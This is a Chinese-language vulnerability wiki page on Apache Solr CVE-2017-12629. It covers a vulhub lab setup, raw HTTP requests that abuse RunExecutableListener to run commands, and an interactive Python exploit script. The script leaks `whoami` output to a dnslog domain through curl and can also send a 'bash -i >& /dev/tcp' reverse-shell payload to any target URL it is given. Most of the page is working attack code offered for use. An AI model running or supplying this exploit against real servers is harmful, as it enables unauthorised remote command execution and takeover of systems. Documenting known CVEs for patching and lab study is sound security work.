<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/Apache%20Solr%20RCE%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/">
    <link rel="shortcut icon" href="../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Apache Solr RCE \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e CVE-2017-12629", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u73af\u5883\u642d\u5efa", url: "#_3" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Apache%20Solr%20RemoteStreaming%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Apache%20Solr%20RemoteStreaming%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Apache Solr RemoteStreaming 文件读取与SSRF漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Apache%20Solr%20RCE%20%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CVE-2020-13957/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Apache%20Solr%20RCE%20%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CVE-2020-13957/" class="btn btn-xs btn-link">
        Apache Solr RCE 未授权上传漏洞 CVE-2020-13957
      </a>
    </div>
    
  </div>

    

    <h1 id="apache-solr-rce-cve-2017-12629">Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629<a class="headerlink" href="#apache-solr-rce-cve-2017-12629" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：<a href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-XXE">XML实体扩展漏洞（XXE）</a>和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。</p>
<p>参考阅读：</p>
<ul>
<li>
<p><a href="https://www.freebuf.com/sectool/159970.html">Apache Solr远程代码执行漏洞（CVE-2017-12629）从利用到入侵检测</a></p>
</li>
<li>
<p><a href="https://blog.csdn.net/whatday/article/details/106974271?utm_medium=distribute.pc_relevant.none-task-blog-title-7&amp;spm=1001.2101.3001.4242">cve-2017-12629 apache solr xxe &amp; rce 漏洞分析</a></p>
</li>
</ul>
<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>Apache Solr &lt; 7.1
</code></pre></div>
<h2 id="_3">环境搭建<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>https://github.com/vulhub/vulhub.git
cd vulhub/solr/CVE-2017-12629
docker-compose build
docker-compose up -d
</code></pre></div>
<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<p>先请求url地址获取 core 内容</p>
<p><a href="http://xxx.xxx.xxx.xxx:8983/solr/admin/cores">http://xxx.xxx.xxx.xxx:8983/solr/admin/cores</a></p>
<p><img alt="image-20220209115009776" src="../images/202202091150843.png" /></p>
<p>通过查看代码，能够触发命令执行的事件有两个：postCommit 和 newSearcher</p>
<p><img alt="image-20220209115027117" src="../images/202202091150170.png" /></p>
<p>第一个请求包用于载入缓存中</p>
<p>exe : ping  执行的命令</p>
<p>dir: 命令存在的目录位置</p>
<p>args:命令参数</p>
<p>如下请求包执行的是 /bin/ping 1.1.1.1</p>
<div class="highlight"><pre><span></span><code><span class="err">POST</span><span class="w"> </span><span class="err">/solr/demo/co</span><span class="kc">nf</span><span class="err">ig</span><span class="w"> </span><span class="err">HTTP/</span><span class="mf">1.1</span>
<span class="err">Hos</span><span class="kc">t</span><span class="p">:</span><span class="w"> </span><span class="err">xxx.xxx.xxx.xxx</span><span class="p">:</span><span class="mi">8983</span>
<span class="err">Co</span><span class="kc">nne</span><span class="err">c</span><span class="kc">t</span><span class="err">io</span><span class="kc">n</span><span class="p">:</span><span class="w"> </span><span class="err">close</span>
<span class="err">Co</span><span class="kc">ntent</span><span class="mi">-</span><span class="err">Type</span><span class="p">:</span><span class="w"> </span><span class="err">applica</span><span class="kc">t</span><span class="err">io</span><span class="kc">n</span><span class="err">/jso</span><span class="kc">n</span><span class="w">  </span>
<span class="err">Co</span><span class="kc">ntent</span><span class="mi">-</span><span class="err">Le</span><span class="kc">n</span><span class="err">g</span><span class="kc">t</span><span class="err">h</span><span class="p">:</span><span class="w"> </span><span class="mi">198</span>

<span class="p">{</span>
<span class="w">  </span><span class="nt">&quot;add-listener&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;event&quot;</span><span class="p">:</span><span class="s2">&quot;postCommit&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="s2">&quot;newlistener-1&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;class&quot;</span><span class="p">:</span><span class="s2">&quot;solr.RunExecutableListener&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;exe&quot;</span><span class="p">:</span><span class="s2">&quot;ping&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;dir&quot;</span><span class="p">:</span><span class="s2">&quot;/bin/&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;args&quot;</span><span class="p">:[</span><span class="s2">&quot;1.1.1.1&quot;</span><span class="p">]</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p><img alt="image-20220209115046585" src="../images/202202091150685.png" /></p>
<p>第二个请求包用于更新缓存并执行命令</p>
<div class="highlight"><pre><span></span><code><span class="err">POST</span><span class="w"> </span><span class="err">/solr/demo/upda</span><span class="kc">te</span><span class="w"> </span><span class="err">HTTP/</span><span class="mf">1.1</span>
<span class="err">Hos</span><span class="kc">t</span><span class="p">:</span><span class="w"> </span><span class="err">xxx.xxx.xxx.xxx</span><span class="p">:</span><span class="mi">8983</span>
<span class="err">Co</span><span class="kc">nne</span><span class="err">c</span><span class="kc">t</span><span class="err">io</span><span class="kc">n</span><span class="p">:</span><span class="w"> </span><span class="err">close</span>
<span class="err">Co</span><span class="kc">ntent</span><span class="mi">-</span><span class="err">Type</span><span class="p">:</span><span class="w"> </span><span class="err">applica</span><span class="kc">t</span><span class="err">io</span><span class="kc">n</span><span class="err">/jso</span><span class="kc">n</span><span class="w">  </span>
<span class="err">Co</span><span class="kc">ntent</span><span class="mi">-</span><span class="err">Le</span><span class="kc">n</span><span class="err">g</span><span class="kc">t</span><span class="err">h</span><span class="p">:</span><span class="w"> </span><span class="mi">198</span>

<span class="p">[{</span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="s2">&quot;test&quot;</span><span class="p">}]</span>
</code></pre></div>
<p><img alt="image-20220209115108238" src="../images/202202091151324.png" /></p>
<p>注意 第一个请求包的这个位置 "name":"newlistener-1",listerer的名字需要替换</p>
<p>例如第一次 为 newlistener-1 ，第二次则需要改为 newlistener-2</p>
<p>注意 第二个请求包的这个位置  [{"id":"test"}]，同第一个请求包的name，每执行一次就需要更换 id ,例如第一次 为 test ，第二次则需要改为 tset-2</p>
<p>注意 Content-Type: application/json 需要添加</p>
<p>不更改执行发生报错示例</p>
<p><img alt="image-20220209115145295" src="../images/202202091151387.png" /></p>
<p>进入docker容器查看发现命令已经执行</p>
<p><img alt="image-20220209115203844" src="../images/202202091152887.png" /></p>
<p>使用 newSearcher可以直接加载入缓存执行命令</p>
<p>请求包如下</p>
<div class="highlight"><pre><span></span><code><span class="err">POST</span><span class="w"> </span><span class="err">/solr/demo/co</span><span class="kc">nf</span><span class="err">ig</span><span class="w"> </span><span class="err">HTTP/</span><span class="mf">1.1</span>
<span class="err">Hos</span><span class="kc">t</span><span class="p">:</span><span class="w"> </span><span class="err">xxx.xxx.xxx.xxx</span><span class="p">:</span><span class="mi">8983</span>
<span class="err">Co</span><span class="kc">nne</span><span class="err">c</span><span class="kc">t</span><span class="err">io</span><span class="kc">n</span><span class="p">:</span><span class="w"> </span><span class="err">close</span>
<span class="err">Co</span><span class="kc">ntent</span><span class="mi">-</span><span class="err">Type</span><span class="p">:</span><span class="w"> </span><span class="err">applica</span><span class="kc">t</span><span class="err">io</span><span class="kc">n</span><span class="err">/jso</span><span class="kc">n</span><span class="w">  </span>
<span class="err">Co</span><span class="kc">ntent</span><span class="mi">-</span><span class="err">Le</span><span class="kc">n</span><span class="err">g</span><span class="kc">t</span><span class="err">h</span><span class="p">:</span><span class="w"> </span><span class="mi">198</span>

<span class="p">{</span>
<span class="w">  </span><span class="nt">&quot;add-listener&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;event&quot;</span><span class="p">:</span><span class="s2">&quot;newSearcher&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="s2">&quot;newlistener-2&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;class&quot;</span><span class="p">:</span><span class="s2">&quot;solr.RunExecutableListener&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;exe&quot;</span><span class="p">:</span><span class="s2">&quot;bash&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;dir&quot;</span><span class="p">:</span><span class="s2">&quot;/bin/&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;args&quot;</span><span class="p">:[</span>
<span class="w">         </span><span class="s2">&quot;-c&quot;</span><span class="p">,</span>
<span class="w">         </span><span class="s2">&quot;mkdir /tmp/vuln&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="p">]</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>注意点同上，也需要每次执行更改 "name":"newlistener-2" 的参数</p>
<p><img alt="image-20220209115226709" src="../images/202202091152811.png" /></p>
<p>成功执行了创建文件的命令</p>
<p><img alt="image-20220209115246047" src="../images/202202091152090.png" /></p>
<p>如果想要执行其他命令,则需要命令的的位置，例如执行ping，则需要设置dir参数为 /usr/bin/ping 或者 /bin/ping，如果需要检测漏洞是否存在则可以使用 dnslog来检测</p>
<p>漏洞POC</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/python3</span>
<span class="c1">#-*- coding:utf-8 -*-</span>
<span class="c1"># author : PeiQi</span>
<span class="c1"># from   : http://wiki.peiqi.tech</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>

<span class="k">def</span><span class="w"> </span><span class="nf">title</span><span class="p">():</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+------------------------------------------&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34mPOC_Des: http://wiki.peiqi.tech                                   </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34mGithub : https://github.com/PeiQi0                                 </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34m公众号 : PeiQi文库                                                     </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34mVersion: Apache Solr &lt; 7.1                                        </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[36m使用格式: python3 cve-2017-12629.py                                 </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983                            </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[36mcmd    &gt;&gt;&gt; dnslog地址(漏洞外连检测)                                  </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[36mCmd    &gt;&gt;&gt; shell(反弹shell)                                        </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+------------------------------------------&#39;</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">POC_1</span><span class="p">(</span><span class="n">target_url</span><span class="p">):</span>
    <span class="n">core_url</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s2">&quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot;</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="n">url</span><span class="o">=</span><span class="n">core_url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
        <span class="n">core_name</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="s2">&quot;status&quot;</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[32m[o] 成功获得core_name,Url为：&quot;</span> <span class="o">+</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s2">&quot;/solr/&quot;</span> <span class="o">+</span> <span class="n">core_name</span> <span class="o">+</span> <span class="s2">&quot;/config</span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">core_name</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[31m[x] 目标Url漏洞利用失败</span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">POC_2</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">core_name</span><span class="p">,</span> <span class="n">dnslog_url</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
    <span class="n">exp_url</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s2">&quot;/solr/&quot;</span> <span class="o">+</span> <span class="n">core_name</span> <span class="o">+</span> <span class="s2">&quot;/config&quot;</span>
    <span class="n">dnslog_url</span> <span class="o">=</span> <span class="s2">&quot;`whoami`.&quot;</span> <span class="o">+</span> <span class="n">dnslog_url</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">,</span>
        <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>
    <span class="p">}</span>
    <span class="n">payload_cmd</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">    {&quot;add-listener&quot;:{&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newSearche-</span><span class="si">%s</span><span class="s2">&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;curl&quot;,&quot;dir&quot;:&quot;/usr/bin/&quot;,&quot;args&quot;:[&quot;</span><span class="si">%s</span><span class="s2">&quot;]}}</span>
<span class="s2">    &quot;&quot;&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">dnslog_url</span><span class="p">)</span>

    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="n">url</span><span class="o">=</span><span class="n">exp_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload_cmd</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span>
    <span class="k">if</span> <span class="s2">&quot;add-listener&quot;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[32m[o] 成功执行，请查看dnslog </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[31m[x] 漏洞利用失败 </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">POC_3</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">core_name</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
    <span class="n">exp_url</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s2">&quot;/solr/&quot;</span> <span class="o">+</span> <span class="n">core_name</span> <span class="o">+</span> <span class="s2">&quot;/config&quot;</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">,</span>
        <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>
    <span class="p">}</span>
    <span class="n">payload_cmd</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">        {&quot;add-listener&quot;:{&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newSearche-</span><span class="si">%s</span><span class="s2">&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/</span><span class="si">%s</span><span class="s2">/</span><span class="si">%s</span><span class="s2"> 0&gt;&amp;1&quot;]}}</span>
<span class="s2">        &quot;&quot;&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>

    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="n">url</span><span class="o">=</span><span class="n">exp_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload_cmd</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span>
    <span class="k">if</span> <span class="s2">&quot;add-listener&quot;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[32m[o] 成功执行 </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[31m[x] 漏洞利用失败 </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">title</span><span class="p">()</span>
    <span class="n">target_url</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[35mPlease input Attack Url</span><span class="se">\n</span><span class="s2">Url &gt;&gt;&gt; </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">))</span>
    <span class="n">core_name</span> <span class="o">=</span> <span class="n">POC_1</span><span class="p">(</span><span class="n">target_url</span><span class="p">)</span>

    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="n">n</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[35mCmd &gt;&gt;&gt; </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s2">&quot;exit&quot;</span><span class="p">:</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s2">&quot;shell&quot;</span><span class="p">:</span>
            <span class="n">IP</span>   <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[35m请输入监听IP   &gt;&gt;&gt; </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">))</span>
            <span class="n">PORT</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[35m请输入监听PORT &gt;&gt;&gt; </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">))</span>
            <span class="n">POC_3</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">core_name</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">IP</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s2">&quot;dnslog&quot;</span><span class="p">:</span>
            <span class="n">dnslog_url</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[35m请输入你的dnslog地址：</span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">))</span>
            <span class="n">POC_2</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">core_name</span><span class="p">,</span> <span class="n">dnslog_url</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
</code></pre></div>
<p><img alt="image-20220209115514982" src="../images/202202091155228.png" /></p>
<p><img alt="image-20220209115536548" src="../images/202202091155591.png" /></p>
<p>如果shell或dnslog无反应，可以选择更改一下POC的部分参数执行需要的代码</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Apache%20Solr%20RemoteStreaming%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Apache%20Solr%20RemoteStreaming%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Apache Solr RemoteStreaming 文件读取与SSRF漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Apache%20Solr%20RCE%20%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CVE-2020-13957/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Apache%20Solr%20RCE%20%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CVE-2020-13957/" class="btn btn-xs btn-link">
        Apache Solr RCE 未授权上传漏洞 CVE-2020-13957
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>